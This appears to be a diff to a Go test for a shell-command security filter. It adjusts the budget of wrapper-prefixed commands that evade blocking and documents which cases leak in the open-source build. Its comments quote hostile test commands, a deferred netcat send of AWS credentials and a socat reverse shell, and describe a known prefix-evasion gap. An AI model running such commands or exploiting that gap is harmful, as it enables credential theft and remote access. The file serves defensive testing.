@@ -52,7 +52,57 @@ func TestWrapperPositionalParity(t *testing.T) {
 	// fix being written and merged — the floor itself (multi-statement
 	// residue that no prefix can preserve) rose for every position,
 	// including the already-fixed controls, not just the new ones.
-	const maxLeaks = 44
+	//
+	// Raised 44 -> 46 by the four compound-word-position corpus cases
+	// (TP-SHADOW-FORLIST-SPLICE-001, TP-SHADOW-ARRAY-SPLICE-001,
+	// TP-SSHKEY-DECLARRAY-SPLICE-001, TP-SHADOW-SELECT-ANSIC-001). All four are
+	// the documented residue class, not new leakage: a prefix wraps only the
+	// FIRST statement, and `nohup for p in X; do ...; done` is not even valid
+	// shell — `for` after a command word is an ordinary argument, so the `do`
+	// that follows is a syntax error. The already-present TP-COMPOUND-EVASION-*
+	// rows leak for exactly this reason.
+	maxLeaks := 46
+
+	// 2026-08-31 (#3592): build-aware, the same shape TestHeredocShellExecParity
+	// and TestBraceWordListParity already use. The number above is calibrated on
+	// the FULL tree; the OSS-stripped tree (packs/premium/ removed per
+	// scripts/publish-oss.sh) enforces a smaller rule set, so the SAME invariant
+	// lands on a different number there. See premium_pack_test.go — pick the
+	// constant, never widen the shared one to cover the weaker tree.
+	//
+	// Measured on 4ffdcee4 (`git archive origin/main` + that strip), per
+	// position, with the unstripped tree as the control:
+	//
+	//   position group        OSS          full
+	//   in-table, no `--`     44/1717      46/2606
+	//   runuser -u root --    47/1717      45/2606
+	//
+	// The leak-set diff is not a count difference — it was computed case by
+	// case. The OSS build leaks exactly two cases the full build does not, on
+	// EVERY position including the controls:
+	//
+	//   TP-DEFEXFIL-008  `(sleep 600 && nc ... < ~/.aws/credentials) &`
+	//   TP-DEFEXFIL-014  `(sleep 60 && socat ... EXEC:/bin/bash) &`
+	//
+	// Probed directly rather than inferred: bare, the OSS build BLOCKs both via
+	// community ts-block-netcat; prefixed, that rule stops firing and the
+	// decision falls to AUDIT on ts-audit-sudo / ts-audit-sudo-alternatives.
+	// The full build BLOCKs both in every form via premium
+	// ne-block-deferred-exfil-sleep / -subshell (packs/premium/network-egress.yaml),
+	// which match the raw text and so survive any prefix. Both cases are already
+	// recorded in scripts/oss-known-failures.txt, so this is not new blindness —
+	// it is blindness already measured, re-expressed as a budget number.
+	//
+	// The other six in-table positions sit at 44 against this 47, i.e. three
+	// counts of slack in the OSS build only. That is the accepted cost of one
+	// number per build: those positions keep ZERO headroom in the full tree
+	// (46/46), which is the gate that runs on every PR. The alternative that was
+	// removed here — baselining the whole `runuser-endopts` subtest — gave those
+	// positions no gate at all, because a third leak would have landed inside an
+	// already-baselined entry and produced no delta.
+	if !premiumPacksPresent() {
+		maxLeaks = 47
+	}
 
 	// The excluded wrappers still bypass, by design. This is not a budget to
 	// improve — it is a pin on the pre-fix behaviour so the exclusion stays
@@ -145,7 +195,8 @@ func TestWrapperPositionalParity(t *testing.T) {
 					leaks = append(leaks, fmt.Sprintf("%s: BLOCK -> %s : %s", tc.ID, got, tc.Command))
 				}
 			}
-			t.Logf("%s: %d/%d leaked", p.prefix, len(leaks), len(baseline))
+			t.Logf("%s: %d/%d leaked (budget %d, premium packs present: %v)",
+				p.prefix, len(leaks), len(baseline), maxLeaks, premiumPacksPresent())
 
 			if p.excluded {
 				if len(leaks) < excludedFloor {
